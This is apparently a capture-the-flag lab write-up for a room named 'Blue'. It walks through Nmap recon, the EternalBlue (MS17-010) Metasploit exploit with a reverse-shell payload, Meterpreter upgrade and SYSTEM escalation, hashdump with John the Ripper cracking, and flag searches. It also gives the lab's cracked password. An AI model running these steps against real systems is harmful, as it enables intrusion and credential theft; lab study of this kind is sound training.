# Blue - Hands On Practice

## Recon

### Concepts learned
- How to scan a host for open ports and services.
- How to confirm an SMB-related vulnerability (MS17-010) from scan results.
- How to count open ports under a given port range and map those findings to likely services.

### Explanation
- I ran an initial full TCP port scan (all ports) then a focused service/version scan for ports under 1000 to quickly identify interesting services.
- SMB-related services (usually on 135/139/445) indicated the host is likely vulnerable to MS17-010; this can be confirmed with an NSE script or Metasploit SMB check/scanner.
- From the scan output the host had 3 open ports under 1000 (typical: 135, 139, 445) and is vulnerable to ms17-010.

### Notes
**Full port/service scan & import to Metasploit DB (recommended):**
  - db_nmap -sS -sV -p- <target-IP>
**Focused service/version scan for ports under 1000 (quick check):**
  - nmap -sS -sV -p1-1000 <target-IP>
**Check SMB MS17-010 with Nmap NSE:**
  - nmap -p 445 --script smb-vuln-ms17-010 <target-IP>
**Confirm with Metasploit scanner (alternative):**
  - msfconsole → use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS <target-IP> → run
**Findings (from lab):**
  - Open ports under 1000: 3 (e.g., 135, 139, 445)
  - Vulnerability identified: ms17-010


## Gain Access

### Concepts learned
- How to pick and load an exploit module by path.
- Importance of setting module options (RHOSTS) and payload selection before running an exploit.
- How to run an exploit, obtain an interactive shell, and background it for multitasking.
- Verifying exploit success and basic session handling (backgrounding with CTRL+Z).

### Explanation
- Load the EternalBlue SMB exploit module and inspect its options. The critical required option is RHOSTS (target IP(s)).
- Override the module’s default payload with windows/x64/shell/reverse_tcp to practice explicit payload selection (this will require setting LHOST).
- Run the exploit; on success you will get a remote DOS/shell. Press Enter if the shell prompt doesn’t immediately appear, then background it (CTRL+Z) so you can continue working in msfconsole.

### Notes
**Start Metasploit:**
  - msfconsole
**Load the exploit:**
  - use exploit/windows/smb/ms17_010_eternalblue
**Inspect required settings:**
  - show options
  - Required field to set: RHOSTS
**Set target(s):**
  - set RHOSTS <target-IP>
**Select explicit payload (practice overriding defaults):**
  - set payload windows/x64/shell/reverse_tcp
**After selecting payload, re-check payload options and set listener details:**
  - show options
  - set LHOST <your-attacker-IP>
  - set LPORT <your-port>    # optional; default 4444
**Run the exploit:**
  - exploit
  - If the DOS/shell prompt doesn’t show immediately, press Enter.
  - Background the interactive shell to return to msfconsole:
  - In the shell prompt: press CTRL+Z → confirm backgrounding when prompted.
**Manage sessions:**
  - sessions          # list active sessions
  - sessions -i <id>  # interact with a session when needed
  - sessions -k <id>  # kill a session
**Practical tips:**
  - If the exploit fails, try again; some network/target timing issues can require multiple attempts or a target reboot.
  - Always show options after changing payloads — payloads add required options (e.g., LHOST).
  - Use exploit -z to run and auto-background if you want the session to open in the background immediately.


## Escalate

### Concepts learned
- How to convert a basic shell to a Meterpreter session using a Metasploit post module.
- That the conversion runs in the context of an existing session and requires selecting the correct SESSION.
- How to use Meterpreter to attempt privilege escalation (getsystem) and migrate into a SYSTEM-owned process for stability and persistence.
- Migration can be unstable and may require retries or re-running conversion.

### Explanation
- Use the post-exploitation module post/multi/manage/shell_to_meterpreter to upgrade a plain shell into a Meterpreter session (provides richer in-memory functionality).
- The module operates against an existing session — you must set the SESSION option to the ID of your shell session.
- After conversion, select the new Meterpreter session, run getsystem to attempt elevation to NT AUTHORITY\SYSTEM, verify by opening a shell and running whoami (or by checking getuid), then migrate into a stable SYSTEM-owned process found with ps.
- If conversion or migration fails, retry: re-run the module, re-exploit if needed, or pick a different target process for migrate.

### Notes
**Background the interactive shell (if you’re in one):**
  - CTRL+Z
**In msfconsole, load the post module:**
  - use post/multi/manage/shell_to_meterpreter
**Show module options:**
  - show options
**List sessions to find your shell session ID:**
  - sessions
**Set the session to convert (replace <id>):**
  - set SESSION <id>
**Run the conversion:**
  - run
**List sessions and interact with the new Meterpreter session (replace <meterpreter-id>):**
  - sessions
  - sessions -i <meterpreter-id>
**Attempt to elevate to SYSTEM:**
  - getsystem
  - getuid
**(Optional) Open a Windows shell and verify user:**
  - shell
  - whoami
# then background the shell
  - CTRL+Z
**Inside Meterpreter, list processes to choose a SYSTEM-owned PID:**
  - ps
**Migrate to the chosen PID (replace <PID>):**
  - migrate <PID>
**Verify current user again after migration:**
  - getuid
**Troubleshooting / tips**
- If run fails, re-exploit to get a fresh shell and repeat.
- If getsystem fails, try different migrate targets (long-running SYSTEM processes like svchost, services.exe, spoolsv).
- Migration can be flaky — retry a few times or pick another PID.
- If you lose the session, check sessions to confirm IDs before re-running.


## Cracking

### Concepts learned
- How to dump Windows account hashes from an elevated Meterpreter session.
- How to save a dumped hash to a file and crack it offline using John the Ripper.
- Treat dumped hashes and cracked credentials as sensitive evidence.

### Explanation
- With SYSTEM privileges, hashdump lists SAM account names and NTLM hashes.
- Save the target user’s hash to a file on your attacking machine, then run a wordlist attack (or other cracking method) against that file.
- After cracking, use the cleartext password for post‑exploitation (credential reuse, pass‑the‑hash, lateral movement) — only in authorized labs.

### Notes
**Dump hashes from Meterpreter (in the elevated meterpreter session):**
  - hashdump
**Copy the relevant hash line (the username:RID:LM:NT:... entry) into a file on your attacker machine, e.g. create jon_hash.txt and paste the line (replace <hash-line> with the actual output):**
  - "cat > jon_hash.txt <<'EOF'
    <hash-line-for-Jon>
    EOF"
**Crack with John using a common wordlist (rockyou example):**
  - john --wordlist=/usr/share/wordlists/rockyou.txt jon_hash.txt
**Show cracked result:**
  - john --show jon_hash.txt
**Lab findings**
  - Non‑default user: Jon
  - Cracked password: alqfna22
**Practical tips**
- If John fails, try additional wordlists or use hashcat with appropriate hash mode for NTLM.
- Keep cracked credentials secure and documented (workspace, session id, file names) for your report.


## Find Flags

### Concepts learned
- Use Meterpreter’s search to quickly locate files of interest (flags, configs, secrets).
- Common places to check on Windows: system root (C:\), SAM database (C:\Windows\System32\config\SAM), Administrator profiles and webroots (C:\Users\Administrator\*, C:\inetpub\wwwroot), and application data under Program Files.
- If a file is missing (race/OS behaviour), re-running the exploit or rebooting the target may be required in lab environments.
- Always document the file path and how you retrieved the file for reporting.

### Explanation
- Flags in CTFs are usually plain files — search -f is the fastest way to find them from a Meterpreter session without guessing specific directories.
- Once located, use download to pull the file to your attacker machine, or cat/type to view it in-session.
- Be cautious: some files (e.g., placed near SAM) can be unstable on Windows; if a file disappears, try re-exploitation or a VM reboot and re-run your steps.

### Notes
**Search the whole filesystem for a filename (example search for “flag”):**
  - meterpreter> search -f flag*
**Search inside a specific directory (e.g., Windows config folder):**
  - meterpreter> search -d C:\\Windows\\System32\\config -f *
**When you find a flag file, download it to your attacker machine (replace <remote-path>):**
  - meterpreter> download "<remote-path>" /tmp/flagX.txt
**Or view its contents in-session:**
  - meterpreter> cat "<remote-path>"
# or on Windows shell:
  - meterpreter> shell
  - C:\> type "<remote-path>"
**Examples of locations to search/check:**
  - C:\                       # system root (Flag1)
  - C:\Windows\System32\config\SAM   # SAM – where Windows stores account hashes (Flag2)
  - C:\Users\Administrator\Desktop   # admin files
  - C:\Users\<user>\Documents
  - C:\inetpub\wwwroot\             # webroot (often contains web flags)
  - C:\Program Files\                # application data & dropped files
**If file is missing or deleted by the system:**
  - Retry the exploit to re-create access and re-run the search/download steps.
  - If repeated failures occur, reboot the target VM and re-run the exploit flow in the lab.
**Practical tip**
  - Keep downloaded flags in a dedicated report folder and note: workspace, session id, remote path, local filename, timestamp — this makes writeups and evidence collection straightforward.


## Keytakeaway
- Performed end‑to‑end hands‑on exploitation against the target (recon → exploit → post‑exploit).
- Recon: scanned the host (Nmap / db_nmap), identified 3 open ports under 1000 and MS17-010 as the vulnerable service.
- Exploitation: used exploit/windows/smb/ms17_010_eternalblue, set RHOSTS, explicitly set the payload, and ran the exploit to gain a shell.
- Upgraded shell: converted a basic shell to Meterpreter using post/multi/manage/shell_to_meterpreter (set SESSION then run).
- Privilege escalation: ran getsystem and verified NT AUTHORITY\SYSTEM; opened a shell and confirmed with whoami.
- Stability: listed processes (ps) and migrated Meterpreter into a SYSTEM-owned, long‑running process to improve reliability.
- Credential access: ran hashdump from an elevated Meterpreter session, saved the user hash, and cracked it offline (Jon → alqfna22).
- Flag discovery: used search -f to locate flags in system root, SAM area, and admin locations; downloaded/viewed flags for writeup.
- Documentation: recorded workspace, modules used, options set, payloads, session IDs, and artifact paths for reproducibility.
- Lab practice & ethics: all actions were completed hands‑on in the lab; remember to perform these steps only in authorized environments.
